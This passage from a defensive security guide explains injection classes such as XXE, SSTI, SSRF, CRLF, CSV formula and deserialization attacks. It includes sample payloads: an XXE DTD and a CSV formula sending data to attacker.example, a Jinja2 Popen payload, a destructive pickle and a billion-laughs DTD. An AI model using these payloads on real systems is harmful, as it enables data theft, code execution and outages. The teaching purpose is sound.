Operator precedence matters: `and` binds tighter than `or`, so this becomes `(name='alice') OR ('1'='1' AND password='...')`, which matches alice regardless of password. The classical "or 1=1" attack on XPath.

XPath 1.0 has no parameterization mechanism — there is no way to bind variables in XPath 1.0 expressions. The defense for XPath 1.0 is therefore escaping: replace `'` with `&apos;` or `"`, then use the opposite quote style. This is the same fragile string-escape pattern as SQL escape.

XPath 2.0 and 3.1 introduce **declared variables**, allowing parameterization:

```xpath
declare variable $name as xs:string external;
declare variable $pw as xs:string external;
//user[name=$name and password=$pw]
```

The application supplies values via the variable-binding API of the XPath processor (e.g., Saxon's `XPathExecutable.load().setExternalVariable(name, value)`). The values cannot become syntax because they are bound after the expression is parsed.

The migration from XPath 1.0 to 2.0/3.1 in Java is `javax.xml.xpath.XPathFactory.newInstance("http://www.w3.org/TR/xpath-30/")` (or similar). Most modern XML libraries support 2.0 or higher; the 1.0-only escapes-only stance is increasingly an artifact of legacy code.

## XML and XXE Theory

XML's design philosophy in the 1990s included **document type definitions** (DTDs) — a way to declare the structure of an XML document using grammar-like rules. DTDs included **entity declarations**: named substitutions that the parser would expand inline. The intent was to allow boilerplate text (a copyright notice, a glossary term) to be defined once and referenced many times.

```xml
<!DOCTYPE doc [
  <!ENTITY copyright "Copyright (c) 2024 Example Corp">
]>
<doc>&copyright;</doc>
```

The parser, on encountering `&copyright;`, replaces it with `Copyright (c) 2024 Example Corp`. Useful for templating. Unfortunately, the DTD specification also permitted **external entities**: entities whose value comes from an external resource specified by URI.

```xml
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<doc>&xxe;</doc>
```

When the parser expands `&xxe;`, it dereferences the URI — opens the file, reads its contents, and substitutes the content into the document. The application that reads the parsed XML now sees `/etc/passwd`'s contents in the `<doc>` element.

This is **XML External Entity (XXE) injection**. The attacker submits a document with a hostile DOCTYPE; the server-side parser dereferences the URI; the attacker reads server-local files via the parsed document's content.

URI schemes vary by parser: `file://` reads files; `http://` makes outbound HTTP requests (potentially as a server-side request forgery vector); `gopher://` and `dict://` (for parsers that support them) enable cross-protocol attacks. Java's XML parsers historically supported `jar:` and `netdoc:`. Each scheme expands the attack surface.

A particularly nasty variant is the **out-of-band XXE**, used when the parser does not echo the document content back to the attacker. The attacker constructs a parameter entity that builds another entity:

```xml
<!DOCTYPE doc [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
```

The remote `evil.dtd` defines:

```xml
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.example/?d=%file;'>">
%param;
%exfil;
```

The parser fetches the file's contents into `%file`, builds a new entity `exfil` whose URI includes those contents, then dereferences `exfil`, sending the file contents in the URL. The attacker's HTTP server logs the URL, recovering the file contents.

The defense is **disable DTDs entirely**, or at minimum disable external entity resolution. In Python's `xml.etree.ElementTree`, this is the default since 3.7.1, but `lxml` requires explicit configuration:

```python
parser = lxml.etree.XMLParser(resolve_entities=False, no_network=True)
```

In Java, the JAXP factories require multiple settings:

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
```

In .NET, `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`. The settings are not the default in older versions of these libraries, which is why XXE has been a recurring CVE class for two decades.

The deeper lesson is that XXE is a **parser-level injection**: the attacker is not exploiting tokenization mistakes, they are exploiting structural features of the XML grammar that the parser implements faithfully. The fix is to disable the feature, not to escape input.

## Billion Laughs (Quadratic Blowup)

A close cousin of XXE is the **billion laughs attack**, also called **XML entity expansion** or **quadratic blowup**. It uses internal entities (no external URIs), so it works even when external entity resolution is disabled.

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Each entity expands to ten copies of the previous, geometrically. `&lol9;` expands to `10^9` copies of `lol`, hence "one billion laughs." The XML document is small (a few hundred bytes), but the parser allocates gigabytes of memory expanding it. The result is a denial-of-service: memory exhausts; the process crashes; the server falls over.

**Quadratic blowup** is a related attack with linear-size payload but quadratic memory consumption — fewer levels of nesting but much longer entity values. Both are mitigated by parser-level limits: most modern parsers have configurable limits on entity expansion depth and total expanded size. Java's JAXP has `jdk.xml.entityExpansionLimit` (default 64,000); Python's `defusedxml` library wraps standard parsers with safer defaults; .NET's `XmlReaderSettings.MaxCharactersFromEntities` defaults to 10 million in newer versions.

The historical name "billion laughs" comes from a 2003 advisory; the issue itself was discussed earlier in the XML community. It is one of the rare DoS attacks named after its payload.

## SSTI Theory

Server-side template injection (SSTI) occurs when user input is concatenated into a template that is then evaluated by a templating engine. Templating engines like Jinja2, Twig, Smarty, Handlebars, ERB, Liquid, FreeMarker, and Velocity all share a syntax: special delimiters (`{{ ... }}`, `<%= ... %>`, `${...}`) that contain expressions evaluated against a context.

The bug is when a developer renders a template *constructed from* user input, not just *containing* user input. Compare:

```python
# Safe: user input is data, template is fixed
template = jinja2.Template("Hello, {{ name }}")
template.render(name=user_input)
```

```python
# Vulnerable: template itself is built from user input
template = jinja2.Template(f"Hello, {user_input}")
template.render()
```

In the second case, if `user_input` is `{{ 7*7 }}`, the rendered output is `Hello, 49`. The expression was evaluated by Jinja2.

This becomes catastrophic because Jinja2 expressions can do more than arithmetic. Jinja2's expression language has access to the rendering context, which includes Python objects. An attacker can navigate the object graph to find dangerous methods.

The classical SSTI payload in Jinja2:

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

`''` is an empty string. `.__class__` is the `str` class. `.__mro__` is the method resolution order — a tuple of all base classes including `object`. `.__mro__[1]` is `object` itself. `.__subclasses__()` returns every subclass of `object` known to the interpreter — a list of hundreds of classes. The attacker scans this list for one that allows arbitrary code execution.

Python's `subprocess.Popen` is in the list. So is `os._wrap_close`, which has access to a `Popen` via its closure. So is `warnings.catch_warnings`, which has a tricky path to `__import__`. The attacker selects an index and constructs the rest of the payload:

```
{{ ''.__class__.__mro__[1].__subclasses__()[NNN]('id', shell=True, stdout=-1).communicate()[0] }}
```

where `NNN` is the index of `subprocess.Popen`. The result is shell command output rendered into the template.

Jinja2 has a "sandbox" mode that attempts to block such attacks by deny-listing `__class__`, `__mro__`, `__subclasses__`, `__import__`, etc. It is widely understood that the sandbox is bypassable: every release of Jinja2 has fixed at least one bypass. The reason is that Python's reflection is too rich for a deny-list to cover; there are too many paths from any object back to dangerous primitives. The Jinja2 documentation now explicitly says the sandbox is a defense-in-depth, not a primary control.

The right fix for SSTI is the same as for SQL injection: **never construct a template from user input**. The template is code; the data goes through `render()` arguments. Treating the two as interchangeable creates the vulnerability.

## Twig, Smarty, Handlebars

The same pattern recurs in every templating engine.

**Twig** (PHP, Symfony) has a similar sandbox with security policies. Bypasses involve filters and global functions. The `_self` variable, the `getEnvironment()` accessor, and reflection over registered extensions provide paths to RCE.

**Smarty** (PHP, classic) has the `{php}` block — historically allowing arbitrary PHP — and a "secure mode" that disables it. Bypasses through assigned functions, custom plugins, or unescaped error messages have been documented.

**Handlebars** (JavaScript) is more constrained: expressions are limited to property access and helper invocation, no arbitrary code. SSTI in Handlebars typically requires that the application registers an unsafe helper or that an attacker can register a helper themselves.

**ERB** (Ruby) and **Liquid** (Shopify) have similar stories.

The general pattern: **helpers + filters + global accessors expose escapes**. A purely declarative templating engine has no SSTI surface, but every real engine eventually grows reflective and dynamic features for ergonomics, and those features become the attack surface.

## SSRF Theory

Server-side request forgery (SSRF) is when a server makes an outbound HTTP request to a URL controlled by an attacker. The attacker uses the server as a proxy to reach internal resources that they cannot reach directly.

A classical case: an application allows users to upload images by URL. The user submits `http://example.com/cat.jpg`; the server fetches the URL, resizes the image, stores it. The feature is benign for public URLs. The bug appears when the user submits an internal URL.

In a cloud environment, the URL `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns the instance's IAM credentials on AWS (with IMDSv1). The application server fetches this URL and now has, in memory, the credentials. If the application then displays the fetched content as part of the response, the credentials leak to the attacker. If the application stores the content somewhere accessible, the credentials leak via that vector.

IMDSv1 was the original AWS instance-metadata service, accessible without authentication. After the Capital One breach (2019), AWS introduced IMDSv2, which requires a token obtained via PUT (so a one-shot SSRF cannot use it). IMDSv2 should be the default on every new instance; legacy IMDSv1-only configurations are still common in older AMIs and deployments.

Other cloud providers have similar metadata endpoints: GCP at `metadata.google.internal`, Azure at `169.254.169.254/metadata/instance`. SSRF that reaches any of these can extract secrets, tokens, and configuration.

Beyond metadata, SSRF is used to:

- Reach internal services (Redis, Memcached, ElasticSearch) that listen on private IPs.
- Probe internal network topology (port scanning via response timing).
- Bypass firewalls by sending requests from the trusted application server.
- Read local files via `file://` or `http://localhost:8080/admin/` style endpoints.

The defenses are layered:

1. **Validate URL host against an allowlist** at the application boundary. Only fetch URLs with hosts you've approved.
2. **Resolve DNS once and pin** to that IP (defending against DNS rebinding, see next section).
3. **Block reserved IP ranges** (RFC 1918 private addresses, loopback, link-local, IMDS endpoints) at the egress firewall.
4. **Use IMDSv2** (or block IMDS entirely from application networking).
5. **Disable URL schemes** other than `http://` and `https://` in your HTTP client.

Each defense covers different bypasses. An allowlist is undermined by URL parsing pitfalls (next section); DNS rebinding is undermined by short-TTL records; firewall blocks are undermined by IPv6 representation tricks. Layering is the only safe approach.

A subtle SSRF surface is in **redirect-following HTTP clients**. The application validates `http://example.com/cat.jpg`, but the response is a 302 redirect to `http://169.254.169.254/`. If the HTTP client follows redirects (most do, by default), the second request is to the metadata endpoint — past the application's URL validation. The fix is to either disable redirect-following or re-validate the redirect's URL before following.

## DNS Rebinding

DNS rebinding is a category of attack exploiting the gap between an application's DNS resolution at validation time and at fetch time. The attacker controls a DNS server and a web origin.

Steps:

1. Application receives a URL `http://attacker.example/`.
2. Application validates the URL: resolves `attacker.example` via DNS, gets `198.51.100.1` (a public, attacker-controlled IP), checks that this IP is not in a blocked range, and accepts the URL.
3. Application initiates an HTTP fetch. It re-resolves `attacker.example`. The TTL on the original DNS response was 1 second; the cache has expired. The attacker's authoritative DNS server now responds with `127.0.0.1` or `169.254.169.254` or any internal IP.
4. The HTTP client connects to the attacker-chosen IP, sending the `Host: attacker.example` header.
5. The internal service receives a request with a non-matching Host header (often ignored), serves the response.
6. The application receives the internal-service response, possibly displaying it back to the attacker.

The attack works because validation and fetch are two separate DNS lookups. The application's threat model assumes DNS is consistent across short time windows; the attacker's DNS server proves otherwise.

Mitigations:

- **Resolve once, fetch with the IP**: validate the URL by resolving the host, then connect to the specific IP, sending the Host header explicitly. The HTTP client never re-resolves.
- **DNS pinning at the OS level**: configure `/etc/hosts` or systemd-resolved to override resolution for trusted domains.
- **Host header validation at the destination**: services should reject requests with unexpected Host headers (some do; many don't).
- **Egress firewall**: block private-IP egress regardless of DNS.

The Capital One breach exploited a vulnerable WAF (ModSecurity) that, in conjunction with an SSRF in the customer application, fetched IMDSv1 credentials. DNS rebinding was not the proximate cause, but the same class of indirection-via-DNS amplifies SSRF surface.

Two real-world DNS-rebinding cases worth knowing: Filippo Valsorda's 2019 demonstration that browser-side DNS rebinding could read responses from `127.0.0.1` services running on developer laptops (memcached, some MQTT servers, Plex Media Server). And the recurring research that home-router admin interfaces, Bitcoin wallet RPC servers, and cloud-storage local APIs are all reachable via DNS rebinding from a visited webpage.

## URL Parsing Pitfalls

URLs are deceptively complex. RFC 3986 defines the syntax, but many implementations disagree about edge cases, and SSRF defenders have to know what their HTTP client thinks the host is.

The userinfo problem: RFC 3986 section 3.2.1 allows `userinfo@` before the host:

```
http://user:password@example.com/
```

A naive validator that takes the part after `://` and before the next `/` and looks for "example.com" might match `http://example.com@evil.example/` — where `example.com` is not the host but the userinfo. The actual host is `evil.example`. The HTTP client connects to `evil.example`. The validator was fooled.

```python
# Naive: vulnerable
allowed = "example.com" in url

# Better: parse and check
parsed = urllib.parse.urlparse(url)
if parsed.hostname != "example.com":
    raise ValueError("not allowed")
```

`urlparse` correctly extracts `parsed.hostname` (just the host, no userinfo, no port). But other languages and parsers can disagree.

**Library-level disagreements:** Python's stdlib `urlparse` differs slightly from `requests`, which differs from `httpx`. Java's `URL` differs from `URI` (one validates more strictly). Curl differs from wget. Browsers (which follow the WHATWG URL spec) differ from RFC 3986 in many cases. For an SSRF defender, the gold standard is "use the same parser as the HTTP client you are about to invoke; ask the parser for the host; check the parsed host." Anything else risks divergence.

**IDN homograph bypasses**: `https://раура1.com/` (using Cyrillic characters that look like Latin) is a different domain than `https://paypal.com/`. Punycode encoding (`xn--...`) makes IDN homographs visible at the protocol layer but invisible in displayed UIs. Allowlist defenses must compare punycode forms.

**IPv6 representation tricks:** the IP `127.0.0.1` can also be written as:

- `::1` (loopback in IPv6)
- `::ffff:127.0.0.1` (IPv4-mapped IPv6)
- `::ffff:7f00:1` (numeric form of the same)
- `0::ffff:7f00:1` (with leading zero)
- `::` followed by `ffff:7f00:0001`
- `0x7f000001` (decimal `2130706433`, which Linux's `inet_aton` accepts)
- `017700000001` (octal)
- `127.1` (truncated, accepted by `inet_aton`)
- `2130706433` (single-integer form, accepted by `inet_aton`)

A naive blocklist of `127.0.0.1` and `::1` misses the rest. The fix is to canonicalize the address — parse it into a binary representation, then check whether the binary form falls in a blocked range — rather than to enumerate string forms.

In Python:

```python
import ipaddress
addr = ipaddress.ip_address(socket.gethostbyname(host))
if addr.is_private or addr.is_loopback or addr.is_link_local:
    raise ValueError("private IP")
```

`ipaddress` parses every notation correctly and exposes the canonical predicates.

## Header Injection / CRLF

HTTP headers are separated by `\r\n` (CRLF). The headers section ends with a blank line (`\r\n\r\n`). If an attacker controls a value that gets emitted as a header, and the value contains `\r\n`, the attacker can terminate the current header and inject new headers — or terminate the headers entirely and inject a body.

Example: an application sets a redirect via:

```python
response.headers["Location"] = user_input
```

If `user_input` is `https://example.com/\r\nSet-Cookie: session=evil`, the rendered response (in a vulnerable framework) is:

```
HTTP/1.1 302 Found
Location: https://example.com/
Set-Cookie: session=evil
...
```

The browser accepts both headers. The attacker has set a cookie in the user's session. This is **HTTP Response Splitting**, identified in the mid-1990s and a recurring class of bugs ever since.

A more dramatic version splits the entire response in two:

```
Location: https://example.com/\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>EVIL</html>
```

If a caching proxy is in between, the proxy may treat the second response as a separate cached response for the next URL — **cache poisoning**.

Modern frameworks defend at the header-setting API:

- **werkzeug** (Flask, Django): the `Headers.add` method strips `\r\n` from values.
- **Express** (Node.js): rejects header values with CRLF.
- **Go's net/http**: returns an error from `Header.Set` if the value contains `\r\n`.
- **Java Servlet**: similar protection in newer versions.

But applications that build raw response strings — anywhere the developer writes `response.write("Location: " + url + "\r\n")` — are still vulnerable. The defense is to use the framework's typed header API and trust it to strip CRLF.

A relative of header injection is **HTTP request smuggling**, where mismatches between front-end and back-end parsing of `Content-Length` and `Transfer-Encoding` headers let an attacker smuggle a second request through a single TCP connection. Smuggling is more involved than response splitting but uses the same primitive: control over header bytes.

## Mail Header Injection

The same CRLF problem appears in email. RFC 5322 defines email headers with the same `\r\n` separator. A contact form that takes a user's name and email address:

```python
msg = f"From: {name} <{email}>\r\nTo: contact@example.com\r\nSubject: Contact form\r\n\r\n{body}"
```

If the attacker submits `email = "alice@example.com\r\nBcc: spam-target@example.com"`, the resulting message has:

```
From: Alice <alice@example.com>
Bcc: spam-target@example.com
To: contact@example.com
Subject: Contact form
```

When the SMTP server processes the message, it sends a copy to the Bcc address — using the application server's IP, the application's authenticated SMTP credentials. The contact form has become a spam relay.

Worse, the attacker can inject the entire body. After the headers, an empty line ends the header section; everything after is the body. An injected `\r\n\r\n` followed by an attacker-controlled body delivers arbitrary content as if from the application.

Defenses:

- Use a typed email API (`email.message.EmailMessage` in Python, `MimeMessage` in Java) that handles header construction.
- Validate addresses with `email_validator` or similar — addresses should not contain `\r\n` or other control characters.
- For multi-recipient logic, use the API's `to` and `bcc` fields, not raw header strings.

UTF-8 in headers is encoded via RFC 2047 encoded-words: `=?UTF-8?B?...?=` for base64, `=?UTF-8?Q?...?=` for quoted-printable. Naive implementations that pass UTF-8 directly may produce non-conforming headers; libraries handle the encoding correctly. Some encoded-word implementations have had bugs around long names, special characters in encoded segments, and whitespace handling — the library is the safer bet.

## CSV Formula Injection

CSV is a deceptive case. CSV itself is a simple format — comma-separated values, possibly quoted. There is no executable code in CSV. So why is it on this list?

Because the recipient interpreter for many CSV files is Microsoft Excel (or LibreOffice Calc, or Google Sheets, or Apple Numbers), and these spreadsheets interpret cells beginning with `=`, `+`, `-`, or `@` as formulas. The CSV file itself is not malicious; the spreadsheet's import code is what introduces the vulnerability.

An attacker controls a "name" field that is later exported by the application to a CSV download. The attacker submits:

```
=HYPERLINK("http://attacker.example/?d="&A1, "Click here")
```

When a victim opens the CSV in Excel, the cell renders as a hyperlink. Clicking it sends the contents of cell `A1` (perhaps another user's email) to the attacker. Variants use `=cmd|' /c calc'!A1` (older Excel via DDE) to launch processes. `@SUM(...)` and `+1+1` also trigger formula parsing.

The fixes are at the CSV-emission boundary:

1. **Prepend `'` or a tab** to any cell beginning with `=`, `+`, `-`, `@`. Excel treats `'` as a "force as text" prefix; the cell renders without the leading quote but the formula does not execute.
2. **Use an Excel-aware library** (openpyxl in Python, Apache POI in Java) that knows about formula prefixes and writes them as text strings.
3. **Document the risk**: when CSV files are intended for spreadsheet consumption, anyone who can submit data to be exported can attempt formula injection. UI affordances (download warnings, type indicators) help.

Pandas's `DataFrame.to_csv` does not escape formula prefixes by default. This has caused real CVEs in applications that use pandas for export. The recommendation is to wrap `to_csv` in a function that prepends `'` to cells starting with the formula characters.

## Code Injection Theory

Some interpreters take a string and execute it as code. This is by design. `eval`, `exec`, `Function`, `pickle.loads`, `yaml.load` (with arbitrary tags), Java's `ScriptEngine`, .NET's `Roslyn`, Ruby's `eval`, PHP's `eval` and `assert(string)`, all have the same contract: bytes go in, code runs.

If the bytes come from an untrusted source, the code is attacker-authored. There is no parser confusion, no escape evasion, no clever payload-crafting. The interpreter does exactly what it says on the tin.

The mantra: **never pass untrusted data to `eval`, `exec`, or any interpreter API**.

When a developer reaches for `eval`, the use case is almost always something tractable by safer means:

- "I need to parse a configuration string that includes lists and dicts." Use `ast.literal_eval` (Python) — a parser for Python literals only, no callable invocation.
- "I need to deserialize cached objects." Use JSON, msgpack, protobuf, or any non-executing format.
- "I need to evaluate a mathematical expression from user input." Use a dedicated expression evaluator (sympy, asteval, mathjs) — these have parsers that recognize numbers, operators, and a fixed set of safe functions, refusing arbitrary code.
- "I need a templating system." Use a templating engine — but pass user input as data, not as template source.

The escape from `eval`-equivalent surface is always available; the question is whether the developer reaches for it. The temptation is that `eval` is one line and a parser library is several. The cost of the temptation is well-documented.

## Pickle Specifics

Python's `pickle` module is a serialization format that allows arbitrary callable invocation as part of deserialization. The format includes opcodes like `REDUCE`, which pops a callable and a tuple of arguments off the pickle's stack and pushes the result of calling the callable. The intent was to allow custom `__reduce__` methods on user classes to define how their objects serialize and deserialize. The realization is that any callable in the running Python process can be invoked by a pickle — including `subprocess.Popen`, `os.system`, `exec`, `__import__`.

A weaponized pickle:

```python
import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ("rm -rf /tmp/important",))

payload = pickle.dumps(RCE())
# payload is a bytes string
pickle.loads(payload)  # executes: rm -rf /tmp/important
```

`pickle.loads` invoked on attacker-controlled bytes is straightforward remote code execution. Every Python developer should treat `pickle.loads(untrusted_bytes)` as `exec(untrusted_string)`. The Python documentation says this clearly: "Never unpickle data received from an untrusted or unauthenticated source."

The same shape exists in `marshal` (less rich, but still unsafe), `shelve` (built on pickle), and `dill` (a more powerful pickle extension). Any "load this serialized Python object" API should be assumed unsafe with untrusted input.

Safe alternatives:

- **JSON** for simple, hierarchical, untyped data.
- **msgpack** for binary efficiency, same data model as JSON.
- **Protocol Buffers** for typed schemas with backward compatibility.
- **CBOR** for a binary format with broader type coverage than JSON but no executable extensions.

If you must use pickle for performance reasons (e.g., scientific Python pipelines), authenticate the source — sign the pickle with HMAC, verify the signature before deserializing. This downgrades the trust requirement to "trust the signing key" rather than "trust everyone who can write to the storage."

## Java Deserialization

Java's `ObjectInputStream.readObject()` is the JVM equivalent of `pickle.loads`. It deserializes a graph of Java objects from a binary format. Like pickle, the format includes the classes and fields of the serialized objects; the deserializer instantiates them and populates their fields.

The vulnerability surface arose because some classes have side-effects in their `readObject` methods (which are called during deserialization), and because some commonly-deployed classes form **gadget chains** — sequences of constructors and method invocations that, when deserialized in the right order, terminate in a call to `Runtime.exec` or similar.

The most famous gadget chain involved Apache Commons Collections (CVE-2015-7501). The `InvokerTransformer` class wraps a method invocation: given an object, call a named method with given arguments. Combined with `LazyMap` (which calls a transformer when a key is missing), `ChainedTransformer` (which runs multiple transformers in sequence), and `TransformedMap` (which applies a transformer when adding entries), an attacker can construct a serialized graph that, on deserialization, calls `Runtime.getRuntime().exec("rm -rf /")`.

The attacker's serialized blob can be sent to any endpoint that calls `ObjectInputStream.readObject()`. Historically, this included JBoss, WebSphere, Jenkins, OpenNMS, and many other Java applications that used Java serialization for inter-service RPC. The 2015 disclosure prompted a major industry response: many products patched, deserialization filters were introduced, and Java 9 added `ObjectInputFilter` for class-level deserialization control.

Other gadget chains have been found in Spring, Hibernate, Java's own RMI, and various commercial libraries. The presence of Apache Commons Collections on the classpath was sufficient to make many applications vulnerable, even if those applications never directly used the library.

The defense is multilayered:

1. **Don't use Java serialization for untrusted data.** Use JSON, Protocol Buffers, XML with a strict schema. Java's serialization should be considered an internal-only protocol.
2. **Set `ObjectInputFilter`** to a strict allowlist of expected classes if you must deserialize.
3. **Keep dependencies updated** — gadget chains are continuously discovered; patches are issued.
4. **Audit endpoints** that accept serialized payloads. Tools like `ysoserial` (a database of gadget payloads) help validate.

The historical severity of CVE-2015-7501 was on the order of "Heartbleed-tier": every Java application with the right library on its classpath was potentially affected. The persistence of the issue — gadget chains keep being discovered a decade later — illustrates why the right answer is to abandon Java serialization for external interfaces.

## .NET BinaryFormatter

`System.Runtime.Serialization.Formatters.Binary.BinaryFormatter` is the .NET equivalent. It has the same shape: arbitrary type instantiation, side-effecting deserialization, gadget chains. Microsoft has acknowledged the format as fundamentally unsafe and deprecated it in .NET 5; calling it now produces compiler warnings.

The recommended .NET serializer is `System.Text.Json` (or `Newtonsoft.Json`), with type-discriminator handling configured carefully. For binary scenarios, `MessagePack-CSharp` and `protobuf-net` are popular. None of these are inherently dangerous in the way BinaryFormatter is.

`SoapFormatter`, `NetDataContractSerializer`, and `LosFormatter` (used by ASP.NET ViewState) have had similar issues and are similarly deprecated or restricted.

## XSS Output-Encoding Theory

Cross-site scripting (XSS) is a parser-confusion bug for HTML/JavaScript. The browser parses a response as HTML; the attacker has injected content into the response that the browser interprets as a `<script>` tag, an event handler, or a `javascript:` URL. The injected script runs in the victim's browser session.

XSS bugs are categorized by their entry point:

- **Stored XSS**: malicious content is stored on the server (in a database, a profile field, a forum post) and rendered to other users.
- **Reflected XSS**: malicious content is in the request URL (a query parameter) and reflected directly into the response.
- **DOM XSS**: the JavaScript on the page reads from `location.hash`, `document.referrer`, or another attacker-controlled source and inserts it into the DOM via `innerHTML`, `document.write`, or `eval`.

The defense is **output encoding** — escaping the value at the point it is inserted into HTML. The encoding rules depend on the **parser context**:

| Context | Required encoding |
|---------|-------------------|
| HTML body text | `<` `>` `&` to entities; sometimes `"` `'` |
| HTML attribute (quoted) | `<` `>` `&` `"` (or `'` if single-quoted) |
| HTML attribute (unquoted) | many characters; better: always quote attributes |
| JavaScript string literal | `\` `'` `"` `\n` `\r` ` ` ` ` `<` (to avoid `</script>`) |
| URL (in href, src) | percent-encoding for non-URL-safe characters; scheme allowlist |
| CSS value | many characters; restricted set of allowed characters |

The encoding rules differ enough that a single "escape this string" function is wrong for half the contexts. Frameworks address this by providing context-aware auto-escaping:

- **React** escapes `{value}` in JSX as text or attribute value; `dangerouslySetInnerHTML` is the explicit unsafe escape hatch.
- **Vue** has a similar model with `v-html` as the unsafe escape hatch.
- **Go's `html/template`** is context-aware: based on where in the template the action appears, it applies HTML, JavaScript, or URL escaping. This is one of the few server-side frameworks with full context-awareness.
- **Jinja2's autoescape** (with `select_autoescape` or `autoescape=True`) applies HTML escaping by default; developers must mark a value `|safe` to bypass it.
- **Django's templates** auto-escape by default; `{% autoescape off %}` blocks disable it.

The framework-level defense is good but not perfect: developers can opt out, and DOM-XSS through client-side JavaScript is outside the templating system's reach. CSP (next section) covers the gap.

The fundamental insight is the same as for SQL injection: **the value travels through a different channel from the code**. In React, the value is a JavaScript string; the renderer creates a text node from it. The text node has no parsing of `<` characters. The string never becomes HTML source. The escape happens implicitly at the channel boundary.

## CSP Defense-in-Depth

Content Security Policy is a browser-enforced layer atop HTML rendering. The server sends a `Content-Security-Policy` header; the browser refuses to execute scripts (or load images, fonts, etc.) that violate the policy.

A strict CSP for a modern application:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-RANDOM' 'strict-dynamic';
  style-src 'self' 'nonce-RANDOM';
  img-src 'self' data: https:;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
```

The `script-src 'self' 'nonce-RANDOM' 'strict-dynamic'` directive is the heart of XSS protection. `'self'` allows scripts from the same origin. `'nonce-RANDOM'` requires inline scripts to carry a `nonce="RANDOM"` attribute matching the header value (the server generates a fresh random nonce per response). `'strict-dynamic'` allows scripts loaded dynamically by trusted scripts to also be trusted.

The result: even if an attacker successfully injects `<script>...</script>` into the HTML, the script has no nonce and is not executed. The browser refuses. The XSS payload is neutralized by a layer above the HTML parser.

CSP is a defense-in-depth — it does not replace output encoding (which is still the primary defense), but it catches the cases where output encoding fails. The combination of "auto-escape templates" plus "strict CSP" plus "Trusted Types" (next sections) is the modern XSS-resistant stack.

CSP has many other directives: `connect-src` for fetch/XHR destinations, `frame-src` for embedded frames, `media-src` for audio/video, `font-src` for web fonts, `manifest-src` for PWA manifests, `worker-src` for Web Workers. The `report-uri` and `report-to` directives let the browser report violations; running CSP in `report-only` mode for a few weeks before enforcing is the recommended deployment strategy.

## The Universal Defense Layers Theorem

Surveying the various injection classes, a recurring pattern of three defensive layers emerges:

**Layer 1: Input validation (allowlist).** At the boundary where untrusted input enters the system (HTTP request, message queue, file upload), validate that the input matches expectations. For a username, allow only `[a-zA-Z0-9_]` of length 1-32. For an email, parse with an email-validator library and accept only well-formed addresses. For a URL, check the scheme, host, port. For an integer, cast and bound-check. The principle is **fail closed** — anything outside the spec is rejected outright, before any part of the system processes it.

**Layer 2: Parameterized boundary at every protocol crossing.** When the input must reach a SQL engine, send it as a parameter. When it reaches `execve`, send it as `argv[i]`. When it reaches a templating engine, send it as a render argument. The protocol-level separation prevents any tokenizer or parser from confusing the value for code.

**Layer 3: Output encoding by context at the sink.** When the value is rendered into a context with its own grammar (HTML, JS, URL, CSS), encode it for that context. Trust the framework's auto-escaper; provide a "this is a Trusted Type" wrapper for the rare cases where you intentionally render raw content.

The layers compose: even if one layer fails, the others catch the bug. Validation can miss an unforeseen input shape, but parameterization still works. Parameterization can be skipped (a developer reaches for raw SQL), but encoding still works. Encoding can be skipped (a developer writes `dangerouslySetInnerHTML`), but CSP still works. **Defense-in-depth survives single-layer mistakes.**

The theorem has a corollary: if you only have one layer, you are one mistake away from compromise. A single-layer defense is a tightrope; defense-in-depth is a floor.

## Validation Pitfalls

Input validation is necessary but has its own pitfall: **catastrophic backtracking** in regular expressions, also known as **ReDoS** (regular expression denial of service).

Most regex engines (Python `re`, JavaScript, Java, .NET, PCRE) implement a backtracking algorithm for non-deterministic finite automaton (NFA) regexes. For some regex patterns, certain inputs can cause the engine to explore an exponential number of paths before failing.

A canonical example: `(a+)+$`. On the input `aaaaaaaaaaaaaaaaaaaaaaaa!` (24 a's followed by something that doesn't match `$`), the engine tries every way to partition the a's between the inner `a+` and the outer `(...)+`, then backtracks for each partition. Time complexity is O(2^N) in the number of a's.

Real-world ReDoS bugs have hit major codebases: Cloudflare (a single regex pattern in their WAF brought down portions of the internet in 2019), Stack Overflow (a regex in homepage rendering), several JavaScript libraries (validating phone numbers, parsing URLs).

Patterns to watch for:

- **Nested quantifiers**: `(a+)*`, `(a*)+`, `(a+)+`.
- **Alternation with overlap**: `(a|a)*`, `(\w|\d)*`.
- **Quantified groups followed by optional**: `(\w+)?$`.

Defenses:

